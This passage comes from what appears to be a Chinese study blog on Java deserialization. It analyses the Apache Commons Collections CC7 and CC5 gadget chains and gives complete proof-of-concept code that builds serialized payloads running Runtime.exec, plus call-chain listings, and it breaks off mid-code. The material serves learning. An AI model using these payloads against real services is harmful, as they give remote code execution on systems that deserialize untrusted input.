class="number">1</span>);</span><br><span class="line">        ht.put(map2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Field filed=chained.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        filed.set(chained,transformers);</span><br><span class="line"></span><br><span class="line">        serialize(ht);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream objOut=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream objIn=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        Object obj=objIn.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但并没有弹计算机</p><p>这是因为每执行一次map.put方法就会触发一次LazyMap.get()方法添加一对键值对：</p><p><img src="/archives/6a901b58/image-20250708151627760.png" alt="image-20250708151627760"></p><p>而最后反序列化时，AbstractMap.equals方法会判断第二次循环的LazyMap.size()值和第一次size值是否相等：</p><p><img src="/archives/6a901b58/image-20250708151607256.png" alt="image-20250708151607256"></p><p>所以需要移除第一次的yy：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure><p>还有一点faketransformers没传对象是因为每次put都会调用transform方法，而两次put后都返回1，当inner中的键的hashCode相同时，Hashtable.readObject会认为这是两个一样的对象，只执行在readObject的一次循环，导致只执行一次reconstitutionPut方法</p><p>完整poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] faketransformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chained=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">inner1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">inner2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        Map map1=LazyMap.decorate(inner1, chained);</span><br><span class="line">        Map map2=LazyMap.decorate(inner2, chained);</span><br><span class="line"></span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line"></span><br><span class="line">        ht.put(map1,<span class="number">1</span>);</span><br><span class="line">        ht.put(map2,<span class="number">2</span>);</span><br><span class="line">        map2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field filed=chained.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        filed.set(chained,transformers);</span><br><span class="line"></span><br><span class="line">        serialize(ht);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream objOut=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream objIn=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        Object obj=objIn.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/6a901b58/image-20250708153036916.png" alt="image-20250708153036916"></p><p>完整利用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject()</span><br><span class="line">Hashtable -&gt; readObject()</span><br><span class="line">Hashtable -&gt; reconstitutionPut()</span><br><span class="line">AbstractMapDecorator -&gt; equals()</span><br><span class="line">AbstractMap -&gt; equals()</span><br><span class="line">LazyMap -&gt; get()</span><br><span class="line">ChainedTransformer -&gt; transform()</span><br><span class="line">ConstantTransformer -&gt; transform()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="结合CC6"><a href="#结合CC6" class="headerlink" title="结合CC6"></a>结合CC6</h2><p>在Hashtable.reconstitutionPut()方法中调用了key.hashcode()方法，所以其实我们可以结合CC6来执行链子，通过调用TiedMapEntry.hashcode方法执行</p><p>完整poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] faketransformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chained=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">inner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        Map map=LazyMap.decorate(inner, chained);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map, <span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        ht.put(tiedMapEntry,<span class="number">1</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field filed=chained.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        filed.set(chained,transformers);</span><br><span class="line"></span><br><span class="line">        serialize(ht);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream objOut=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream objIn=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        Object obj=objIn.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/6a901b58/image-20250708154634806.png" alt="image-20250708154634806"></p><p>完整调用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject()</span><br><span class="line">Hashtable -&gt; readObject()</span><br><span class="line">Hashtable -&gt; reconstitutionPut()</span><br><span class="line">TiedMapEntry -&gt; hashCode()</span><br><span class="line">TiedMapEntry -&gt; getValue()</span><br><span class="line">LazyMap -&gt; get()</span><br><span class="line">ChainedTransformer -&gt; transform()</span><br><span class="line">ConstantTransformer -&gt; transform()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://infernity.top/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/">https://infernity.top/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/</a></p><p><a href="https://nivi4.notion.site/Java-CommonCollections7-ef80bc3e4c1c47508a5762ac455a6cda">https://nivi4.notion.site/Java-CommonCollections7-ef80bc3e4c1c47508a5762ac455a6cda</a></p><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections7.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections7.java</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13910833.html">https://www.cnblogs.com/nice0e3/p/13910833.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> CC链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC7 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化：CC5利用链深度解析</title>
      <link href="/archives/44c0d2d8/"/>
      <url>/archives/44c0d2d8/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在前面我们CC6链的学习中，由于jdk 8u71以后的版本修改了AnnotationInvocationHandler类中的readObject方法，我们无法通过CC1链调用LazyMap.get()，所以我们找到了<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>类，它的getValue方法可以调用map.get方法:</p><p><img src="/archives/44c0d2d8/image-20250706174936161.png" alt="image-20250706174936161"></p><p>同时在该类中存在hashCode()方法能调用getValue()方法，这让我们自然而然想到HashMap类作为入口</p><p>而在CC5中，我们将学习通过TiedMapEntry类的另一个方法toString来调用LazyMap.get()方法。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><strong>jdk 8u71</strong></li><li><strong>Commons Collection 3.2.1</strong></li></ul><h2 id="CC5分析"><a href="#CC5分析" class="headerlink" title="CC5分析"></a>CC5分析</h2><h3 id="配合InvokerTransformer反射"><a href="#配合InvokerTransformer反射" class="headerlink" title="配合InvokerTransformer反射"></a>配合InvokerTransformer反射</h3><p>观察<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java">ysoserial</a>给的链子：</p><p><img src="/archives/44c0d2d8/image-20250706175733577.png" alt="image-20250706175733577"></p><p>可以看到这里调用LazyMap.get()是TieMapEntry.toString()方法：</p><p><img src="/archives/44c0d2d8/image-20250706175930052.png" alt="image-20250706175930052"></p><p>写的有点问题，这里toString()会通过执行getValue方法从而调用LazyMap.get()方法。</p><p>接着我们需要找到一个类能调用TiedMapEntry.toString()方法，而在ysoserial中给了我们一个全新的类<code>BadAttributeValueExpException</code>类作为我们的反序列化入口：</p><p><img src="/archives/44c0d2d8/image-20250706180514981.png" alt="image-20250706180514981"></p><p>但有个问题，就是<code>BadAttributeValueExpException</code>并没有实现Serializable接口，为什么能作为入口呢？</p><p>其实是因为他继承自Exception类：</p><p><img src="/archives/44c0d2d8/image-20250706180650758.png" alt="image-20250706180650758"></p><p>而Exception类又继承自Throwable类:</p><p><img src="/archives/44c0d2d8/image-20250706180748952.png" alt="image-20250706180748952"></p><p>Throwable类实现了Serializable接口，所以<code>BadAttributeValueExpException</code>类自然就实现了Serializable接口。</p><p>接着我们看<code>BadAttributeValueExpException</code>类的readObject方法：</p><p><img src="/archives/44c0d2d8/image-20250706180945375.png" alt="image-20250706180945375"></p><p>可以看到，当<code>System.getSecurityManager() == null</code>，即系统未启用安全管理器或者val0bj为一下基本类型的包装类时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Long, Integer, Float, Double, Byte, Short, Boolean</span><br></pre></td></tr></table></figure><p>就会执行val0bj.toString()方法，但我们需要调用的是TiedMapEntry.toString()方法，即val0bj需要是TiedMapEntry类型，所以只能看能否满足第一个条件：</p><p><img src="/archives/44c0d2d8/image-20250706181839294.png" alt="image-20250706181839294"></p><p>而恰好是满足的，所以只需要传入val0bj为TiedMapEntry即可</p><p><img src="/archives/44c0d2d8/image-20250706182737773.png" alt="image-20250706182737773"></p><p>而val0bj是通过获取val的值，所以只需将val赋值为TiedMapEnter即可</p><p><img src="/archives/44c0d2d8/image-20250706191356552.png" alt="image-20250706191356552"></p><p><code>BadAttributeValueExpException</code>构造函数会将val.toString()赋值给this.val，如果我直接将TiedMapEntry直接传入的话就会执行TiedMapEntry.toString()了，这就还没到反序列化就将我们的链子走了一遍了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map map=LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(),chained);</span><br><span class="line">        TiedMapEntry tie=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map, chained);</span><br><span class="line">        BadAttributeValueExpException bad=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(tie);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/44c0d2d8/image-20250706214809244.png" alt="image-20250706214809244"></p><p>这样肯定是不行的，所以我们先传入null，然后再通过反射来修改val：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field filed=bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">filed.set(bad,tie);</span><br></pre></td></tr></table></figure><p>完整poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span 